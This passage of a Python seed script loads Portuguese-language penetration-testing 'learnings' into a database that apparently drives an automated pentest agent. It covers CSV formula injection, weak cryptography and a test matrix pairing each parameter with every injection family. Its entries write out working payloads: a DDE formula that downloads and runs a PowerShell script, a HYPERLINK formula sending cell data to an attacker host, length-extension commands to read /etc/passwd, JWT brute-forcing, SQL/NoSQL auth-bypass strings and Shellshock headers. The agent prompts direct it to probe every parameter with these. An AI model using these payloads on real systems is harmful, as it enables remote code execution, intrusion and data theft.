        "recommended_tools": ["curl", "curl-headers", "wapiti"],
        "learned_techniques": [
            {"name": "XSL vendor disclosure", "phase": "P12", "tool": "curl-headers"},
            {"name": "XSL php:function RCE", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CSV injection (Excel formulas)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "CSV / Spreadsheet formula injection (EdOverflow csv-injection.md)",
        "vulnerability_type": "CSV Injection",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/csv-injection.md"],
        "summary": "Hipotese: 'aplicacao exporta dados de usuario para CSV/Excel (relatorio, billing, lista de usuarios)'. Payload comeca com =,+,-,@ e injeta formula DDE quando aberto.",
        "steps_to_reproduce": """
1) Pontos de injecao tipicos:
   - nome, email, descricao, tags
   - qualquer field que aparece em export CSV/XLSX

2) Payloads (postar no field e depois requisitar export):
   =cmd|'/C calc'!A0
   =cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
   %0A-3+3+cmd|'/C calc'!D2
   @SUM(1+1)*cmd|'/C calc'!A0
   +cmd|'/C calc'!A0
   -cmd|'/C calc'!A0
   =HYPERLINK("http://attacker/?x="&A1,"click")

3) Confirmacao:
   curl -sk 'https://T/export.csv' -H 'Cookie: session=...' | head
   # Se vier sem prefixo de escape ('), e vulneravel
""",
        "impact": "RCE no cliente que abre o CSV (Excel/LibreOffice), exfiltracao de dados via HYPERLINK formula, phishing intra-org.",
        "remediation": "Prefixar campos comecando com =,+,-,@ com aspa simples; usar XLSX em vez de CSV; sanitizar antes do export.",
        "learned_mission": "Toda aplicacao SaaS B2B que exporta CSV deve receber probe de '=cmd|...' em campos persistidos. Hipotese surge quando ha endpoint /export.* ou /report.*",
        "learned_prompt": "POST a field containing =cmd|'/C calc'!A0 then GET /export.csv. Check if payload renders literal in CSV.",
        "affected_phases": ["P12", "P14"],
        "affected_skills": ["risk_assessment", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers"],
        "learned_techniques": [
            {"name": "CSV formula injection", "phase": "P12", "tool": "curl-headers"},
            {"name": "Excel HYPERLINK exfil", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Crypto: MD5/SHA-1 collision + length extension + bcrypt
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Crypto weaknesses - MD5/SHA-1 collisions, length-ext, bcrypt wraparound",
        "vulnerability_type": "Cryptographic Weakness",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md"],
        "summary": "Hipotese: 'aplicacao usa hash fraco (MD5/SHA-1) ou MAC sem HMAC, ou bcrypt $2a$ vulneravel a wraparound'. Sinais: assinatura visivel na URL, JWT HS256 com secret previsivel, comprimento de hash 32/40.",
        "steps_to_reproduce": """
1) Detectar hash fraco em URLs/parametros:
   curl -sk -I 'https://T/file?id=1&mac=<hash>' | grep -oE '[a-f0-9]{32,40}'
   # 32 chars hex -> MD5; 40 chars -> SHA-1; 64 -> SHA-256

2) MD5 collision strings (validar uso pre-hash):
   - dois prefixos hex diferentes que colidem em MD5 (lista no crypto.md)
   - se o servidor aceita ambos como assinatura valida -> MD5 quebrado

3) SHA-1 shattered.io PDFs:
   - 2 PDFs com SHA-1 igual e conteudo diferente
   - upload ambos: se considerado o mesmo arquivo -> SHA-1 quebrado

4) Length-extension attack (MAC sem HMAC):
   # original
   curl -sk 'https://T/download?file=report.pdf&mac=563162c9c71a17367d44c165b84b85ab59d036f9'
   # com hash_extender (https://github.com/iagox86/hash_extender)
   hash_extender --data 'file=report.pdf' --secret <len> --append '&file=/etc/passwd' \\
                 --signature 563162c9c71a17367d44c165b84b85ab59d036f9 --format sha1
   # Re-enviar com nova mac
   curl -sk 'https://T/download?file=report.pdf%00...%80...%2F..%2Fetc%2Fpasswd&mac=<novo>'

5) Bcrypt $2a$ wraparound (senhas > 72 chars):
   curl -sk -X POST https://T/login -d 'username=admin&password=' # senha de 73+ chars iguais ate o 72 logam

6) JWT HS256 brute:
   jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
   jwt_tool <token> -X k  # confusao kid

EVIDENCE TO CAPTURE:
  - aceita ambas strings com MD5 igual -> CVSS high
  - extensao bem-sucedida muda comportamento sem falhar mac -> high
  - JWT secret quebrado -> critical
""",
        "impact": "Forjar assinaturas (download links, password reset, MAC), bypass de integrity, account takeover via JWT.",
        "remediation": "Usar HMAC-SHA256 minimo, JWT com RS256/EdDSA, bcrypt com cost>=12 e limitar password length, abandonar MD5/SHA-1.",
        "learned_mission": "Toda URL ou cookie com hex de 32/40 chars merece probe de hash-extension e collision. JWT HS256 sempre passa por jwt_tool brute curto.",
        "learned_prompt": "Detect 32-char hex -> MD5 weak. 40-char -> SHA-1. Try hash_extender with 8..64 byte secret lengths. JWT HS256 -> jwt_tool -C wordlist.",
        "affected_phases": ["P14", "P22"],
        "affected_skills": ["risk_assessment", "weak-cryptography", "vuln-auth-bypass"],
        "recommended_tools": ["curl", "curl-headers", "jwt_tool", "hashcat"],
        "learned_techniques": [
            {"name": "MD5 collision PoC", "phase": "P14", "tool": "curl-headers"},
            {"name": "SHA-1 length extension", "phase": "P14", "tool": "curl-headers"},
            {"name": "Bcrypt 72-char wraparound", "phase": "P14", "tool": "curl-headers"},
            {"name": "JWT HS256 brute", "phase": "P14", "tool": "jwt_tool"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # PRINCIPIO: TODA VARIAVEL = MATRIZ DE TESTE DE INJECAO
    # User-defined learning: every parameter found via code-analyzer must
    # be tested across ALL applicable injection families. Same param can
    # be vulnerable to multiple vectors (XSS + SQLi + LFI + SSTI).
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Param Matrix Testing - cada variavel testada para TODOS os tipos de injecao",
        "vulnerability_type": "Methodology",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://github.com/coffinxp",
        ],
        "summary": "Toda variavel de ambiente descoberta no codigo fonte (form input, query param, header, cookie, JSON field, hidden input, URL segment) deve ser testada contra TODAS as familias aplicaveis: SQLi, XSS, LFI, RFI, SSRF, CRLF, XXE, SSTI, RCE, CSRF, auth bypass, type juggling, mass-assignment. NAO escolher uma familia por param — gerar a matriz inteira.",
        "steps_to_reproduce": """
PRINCIPIO: code-analyzer encontra a variavel; hypothesis_engine gera
N hipoteses por variavel (uma por familia aplicavel).

PROCESSO:
  1) code-analyzer faz GET no alvo + JS, extrai:
     - <form action method enctype> + <input name type>
     - URLs com query strings (?id=, ?search=, ?file=, etc.)
     - Endpoints REST/GraphQL referenciados em JS
     - Headers customizados em XHR (X-Auth-Token, X-API-Key, X-Tenant-Id)
     - process.env / REACT_APP_ / NEXT_PUBLIC_ refs (sao chaves que viram params)
     - Hidden inputs (__VIEWSTATE, __EVENTTARGET em ASP.NET; CSRF tokens)
     - JSON schemas inferidos de respostas (POST body shape)

  2) Para cada variavel descoberta, aplicar o mapa de familias:

     Categoria do nome    Familias a testar
     ---------------------------------------------------------------
     search,q,query,kw   SQLi, XSS, LFI, SSTI, command-injection
     id,uid,pid,user_id  SQLi, IDOR/BOLA, mass-assign, IDOR-by-type
     name,title,desc     XSS, SSTI, CSV-injection (export endpoints)
     email,user,login    Auth-bypass (SQLi+NoSQL), email-injection
     password,pass,pwd   NoSQL ($ne), JSON type-juggle, weak crypto
     url,uri,next,redir  SSRF (gopher/dict/file/AWS metadata),
                         open-redirect (//evil, /\\evil),
                         CRLF (%0d%0a)
     file,path,page,doc  LFI (../etc/passwd, php://filter),
                         RFI (http://attacker/shell), null-byte
     cmd,exec,host,ping  Command injection (;|`$(  ), Shellshock
     callback,cb         JSONP XSS via Content-Type swap, SSRF
     xml,soap            XXE (file://, OOB, DTD remoto)
     template,tpl,view   SSTI ({{7*7}}, ${7*7}, <%= %>)
     role,admin,is_admin Mass-assign (POST extra field), priv-escal
     debug,test,verbose  Hidden param probe, source-disclosure
     _method,_action     Verb tampering (POST -> PUT/DELETE)

  3) Hidden parameters (sempre testar mesmo sem evidencia):
     ?debug=1  ?admin=1  ?test=1  ?dev=1  ?source=1  ?source_code=1
     ?role=admin  ?is_admin=true  ?priv=root
     ?_method=DELETE  ?_action=delete
     Body extra fields: { ...legit, admin:true, role:'admin', superuser:1 }
     curl -X POST -d 'username=foo&password=bar&isAdmin=true' /api/register

  4) Header-based param matrix (toda request leva esses headers de teste):
     X-Forwarded-For: 127.0.0.1     (auth bypass intent)
     X-Forwarded-Host: evil.com     (cache poisoning, password reset poison)
     X-Original-URL: /admin         (IIS routing bypass)
     X-Rewrite-URL: /admin          (Apache routing bypass)
     X-HTTP-Method-Override: PUT    (verb bypass)
     X-Custom-IP-Authorization: 1.1.1.1
     Referer: <SQLi/XSS payload>    (often logged unsafely)
     User-Agent: () { :; }; echo X  (Shellshock)
     Cookie: name=<payload>         (refletivo em alguns apps)
     Host: evil.com                 (host header injection)

  5) Verb tampering matrix (para todo path):
     curl -X OPTIONS  -i /path     (allow-list discovery)
     curl -X PUT      -i /path
     curl -X DELETE   -i /path
     curl -X PATCH    -i /path
     curl -X TRACE    -i /path     (XST)
     curl -H "X-HTTP-Method-Override: DELETE" -i /path

  6) Content-Type matrix (para todo POST endpoint):
     application/x-www-form-urlencoded  (default)
     application/json                    (NoSQL type juggle)
     application/xml                     (XXE)
     text/xml                            (SOAP XXE)
     multipart/form-data                 (file upload bypass)
     application/yaml                    (Pickle/YAML deserialization)

  7) Parameter pollution (HPP):
     /api/get?id=1&id=2          (WAF bypass)
     /api/post body: id=1&id=2

  8) Mass-assignment (auth-required endpoints especialmente):
     PUT /api/user/me
     {"name":"foo"}                       (legit)
     {"name":"foo","role":"admin"}        (mass-assign attempt)
     {"name":"foo","isVerified":true}
     {"name":"foo","tenantId":"victim"}   (cross-tenant)

EXEMPLO COMPLETO:
  Code-analyzer encontra form: POST /login {username, password, csrf_token}
  hypothesis_engine gera:
    H1 sqli/auth-bypass    username  ' OR 1=1--          sqlmap+wapiti
    H2 sqli/auth-bypass    password  ' OR 1=1--          sqlmap+wapiti
    H3 nosql/type-juggle   password  {"$ne":null}        curl
    H4 xss/reflected       username  <script>alert(1)    dalfox
    H5 verb-tampering      -         PUT /login          curl
    H6 header-spoof        -         X-Forwarded-For:127 curl
    H7 host-header         -         Host: evil.com       curl
    H8 csrf                token     omit/forge          curl
    H9 mass-assign         body      {"isAdmin":true}    curl
""",
        "impact": "Cobertura completa de superficie de ataque. Skipar familias por param e o motivo #1 que pentest automatizado perde bugs criticos. Um param vulneravel raramente e a UNICA superficie - se SQLi existe, geralmente XSS e CSRF tambem existem (mesma causa raiz: input nao sanitizado).",
        "remediation": "n/a (metodologia).",
        "learned_mission": "Para CADA variavel encontrada (form input, query param, header, cookie, JSON field), gerar hipoteses contra TODAS as familias aplicaveis ao nome+contexto. Sempre probar hidden params (admin/debug/role) e header matrix mesmo sem evidencia direta. Verb tampering em todo path.",
        "learned_prompt": "When code-analyzer finds a param, generate hypotheses for EVERY applicable injection family. Use the name->families map. Also always test hidden params (admin/debug/role), header matrix (X-Forwarded-For/Host/Method-Override), verb tampering (PUT/DELETE/TRACE), content-type matrix (json/xml), HPP, mass-assign.",
        "affected_phases": ["P03", "P04", "P11", "P12", "P13", "P14", "P15", "P16", "P19"],
        "affected_skills": [
            "asset_discovery", "recon-web-crawl", "risk_assessment",
            "vuln-injection", "vuln-ssrf-redirect", "vuln-auth-bypass",
            "vuln-idor-access-control", "vuln-api-graphql", "vuln-information-disclosure",
        ],
        "recommended_tools": [
            "code-analyzer", "curl-headers", "sqlmap", "dalfox", "wapiti",
            "nuclei", "ffuf-params", "arjun", "paramspider",
        ],
        "learned_techniques": [
            {"name": "Param x family matrix generation", "phase": "P04", "tool": "code-analyzer"},
            {"name": "Hidden param probe (admin/debug/role)", "phase": "P04", "tool": "curl-headers"},
            {"name": "Header injection matrix", "phase": "P05", "tool": "curl-headers"},
            {"name": "Verb tampering battery", "phase": "P14", "tool": "curl-headers"},
            {"name": "Content-Type swap matrix", "phase": "P12", "tool": "curl-headers"},
            {"name": "Mass-assignment probe", "phase": "P14", "tool": "curl-headers"},
            {"name": "HTTP Parameter Pollution", "phase": "P12", "tool": "curl-headers"},
        ],
    },
]


def main():
    db = SessionLocal()
    inserted = 0
    skipped = 0
    try:
        for entry in LEARNINGS:
            existing = (
                db.query(VulnerabilityLearning)
                .filter(
                    VulnerabilityLearning.title == entry["title"],
                    VulnerabilityLearning.source_kind == entry["source_kind"],
                )
                .first()
            )
            if existing:
                skipped += 1
                continue

            techniques = entry.get("learned_techniques", [])
            rec = VulnerabilityLearning(
                owner_id=OWNER_ID,
                status="accepted",
                source_kind=entry["source_kind"],
                source_urls=entry.get("source_urls", []),
                url_count=len(entry.get("source_urls", [])),
                title=entry["title"],
                vulnerability_type=entry.get("vulnerability_type"),
                summary=entry.get("summary", ""),
                steps_to_reproduce=entry.get("steps_to_reproduce", ""),
                impact=entry.get("impact", ""),
                remediation=entry.get("remediation", ""),
                learned_mission=entry.get("learned_mission", ""),
                learned_prompt=entry.get("learned_prompt", ""),
                learned_techniques=techniques,
                technique_count=len(techniques),
                affected_phases=entry.get("affected_phases", []),
                affected_skills=entry.get("affected_skills", []),
                recommended_tools=entry.get("recommended_tools", []),
                raw_extraction={},
                llm_model="manual_seed_v1",
                accepted_by_id=OWNER_ID,
                accepted_at=datetime.utcnow(),
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow(),
            )
            db.add(rec)
            inserted += 1

        db.commit()
        print(f"✓ Inserted: {inserted} learnings | Skipped (already exist): {skipped}")
    except Exception as e:
        db.rollback()
        print(f"✗ Error: {e}")
        raise
    finally:
        db.close()


if __name__ == "__main__":
    main()
